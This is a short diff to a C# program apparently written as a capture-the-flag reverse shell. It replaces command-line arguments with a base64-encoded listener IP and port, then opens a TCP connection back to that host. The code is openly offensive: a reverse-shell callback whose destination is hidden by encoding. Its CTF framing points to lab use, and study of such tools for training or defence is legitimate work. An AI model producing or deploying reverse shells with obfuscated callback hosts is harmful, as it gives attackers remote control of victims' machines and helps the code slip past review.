@@ -14,13 +14,12 @@ namespace ReverseShellCTF
         {
             try
             {
-                if (args.Length != 2)
-                {
-                    return;
-                }
+                string b_ip = "MTkyLjE2OC41LjU="; //base64 encoded LHost IP
+                string b_port = "NDQ1NQ=="; //base64 encoded LHost Port
 
-                string ip = Encoding.UTF8.GetString(Convert.FromBase64String(args[0]));
-                int port = int.Parse(Encoding.UTF8.GetString(Convert.FromBase64String(args[1])));
+
+                string ip = Encoding.UTF8.GetString(Convert.FromBase64String(b_ip));
+                int port = int.Parse(Encoding.UTF8.GetString(Convert.FromBase64String(b_port)));
 
                 using (TcpClient client = new TcpClient(ip, port))
                 using (NetworkStream stream = client.GetStream())
